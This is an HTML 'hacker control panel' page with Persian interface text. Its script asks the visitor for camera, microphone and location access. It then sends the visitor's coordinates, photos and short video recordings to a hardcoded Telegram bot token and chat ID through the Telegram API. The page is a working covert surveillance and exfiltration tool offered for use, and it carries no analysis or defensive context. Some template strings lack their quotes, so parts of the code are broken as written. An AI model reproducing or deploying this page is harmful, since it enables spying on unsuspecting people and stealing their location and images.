<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>H4CK3R P4N3L</title>
  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      background: radial-gradient(ellipse at center, #000 0%, #050505 100%);
      color: #00ff99;
      font-family: 'Share Tech Mono', monospace;
      overflow: hidden;
    }

    .grid-bg {
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      background-image: linear-gradient(90deg, rgba(0,255,153,0.1) 1px, transparent 1px),
                        linear-gradient(rgba(0,255,153,0.1) 1px, transparent 1px);
      background-size: 40px 40px;
      animation: moveGrid 20s linear infinite;
      z-index: -1;
    }

    @keyframes moveGrid {
      0% { background-position: 0 0; }
      100% { background-position: 100px 100px; }
    }

    .title {
      text-align: center;
      font-size: 2.5em;
      margin-top: 30px;
      text-shadow: 0 0 10px #00ff99, 0 0 30px #0f0;
      animation: flicker 2s infinite alternate;
    }

    @keyframes flicker {
      from { opacity: 1; }
      to { opacity: 0.7; }
    }

    .terminal-box {
      width: 90%;
      max-width: 800px;
      margin: 30px auto;
      background: rgba(0, 0, 0, 0.75);
      border: 1px solid #0f0;
      border-radius: 10px;
      padding: 20px;
      box-shadow: 0 0 20px #0f04;
    }

    .btn {
      background-color: transparent;
      color: #00ff99;
      border: 2px solid #00ff99;
      padding: 12px 20px;
      font-size: 1em;
      border-radius: 8px;
      margin: 10px 5px;
      cursor: pointer;
      transition: 0.3s;
      text-shadow: 0 0 5px #0f0;
    }

    .btn:hover {
      background-color: #00ff9944;
      box-shadow: 0 0 15px #0f0;
      transform: scale(1.05);
    }

    #video {
      margin-top: 15px;
      border: 2px solid #0f0;
      border-radius: 6px;
    }

    #location, #audioStatus {
      margin-top: 10px;
      font-size: 1em;
      color: #8f8;
    }

    .section-title {
      margin-top: 20px;
      font-weight: bold;
      color: #7f7;
    }

    .typing::after {
      content: '|';
      animation: blink 0.8s infinite;
    }

    @keyframes blink {
      0% { opacity: 1; }
      50% { opacity: 0; }
      100% { opacity: 1; }
    }
  </style>
</head>
<body>

  <div class="grid-bg"></div>

  <div class="title typing">H4CK3R C0NTR0L P4N3L</div>

  <div class="terminal-box">
    <button class="btn" onclick="requestPermissions()">درخواست دسترسی</button>

    <div id="camera" style="display:none;">
      <div class="section-title">پخش زنده دوربین:</div>
      <video id="video" width="320" height="240" autoplay></video><br>
      <button class="btn" onclick="captureImage()">گرفتن عکس</button>
      <button class="btn" onclick="captureVideo()">ضبط ویدیو</button>
    </div>

    <div id="locationResult" style="display:none;">
      <div class="section-title">موقعیت مکانی:</div>
      <p id="location"></p>
    </div>

    <div id="audioResult" style="display:none;">
      <div class="section-title">میکروفون:</div>
      <p id="audioStatus"></p>
    </div>
  </div>

  <script>
    let stream = null;
    const token = '8128114892:AAE_Yv6GG0tMPlO3ce9WpWQFsH1Ug58W08w';
    const chatId = '6368940774';

    function requestPermissions() {
      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(s => {
          stream = s;
          document.getElementById('video').srcObject = stream;
          document.getElementById('camera').style.display = 'block';
          document.getElementById('audioStatus').textContent = 'میکروفون فعال شد.';
          document.getElementById('audioResult').style.display = 'block';if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
              const { latitude, longitude } = pos.coords;
              document.getElementById('location').textContent = Latitude: ${latitude}, Longitude: ${longitude};
              document.getElementById('locationResult').style.display = 'block';
              sendToTelegram(موقعیت مکانی: Latitude: ${latitude}, Longitude: ${longitude});
            }, err => {
              document.getElementById('location').textContent = 'عدم دریافت موقعیت.';
    
            });
        
          }
        })
        .catch(err => alert("خطا: " + err));
    }

    function captureImage() {
      const videoElement = document.getElementById('video');
      const canvas = document.createElement('canvas');
      canvas.width = videoElement.videoWidth;
      canvas.height = videoElement.videoHeight;
      canvas.getContext('2d').drawImage(videoElement, 0, 0);
      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'photo.png');
        fetch(https://api.telegram.org/bot${token}/sendPhoto, {
          method: 'POST',
          body: formData
        });
      }, 'image/png');
    }

    function captureVideo() {
      const recorder = new MediaRecorder(stream);
      const chunks = [];
      recorder.ondataavailable = e => chunks.push(e.data);
      recorder.onstop = () => {
        const blob = new Blob(chunks, { type: 'video/webm' });
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('video', blob, 'video.webm');
        fetch(https://api.telegram.org/bot${token}/sendVideo, {
          method: 'POST',
          body: formData
        });
      };
      recorder.start();
      setTimeout(() => recorder.stop(), 5000);
    }

    function sendToTelegram(message) {
      fetch(https://api.telegram.org/bot${token}/sendMessage, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
      });
    }
  </script>
</body>
</html>
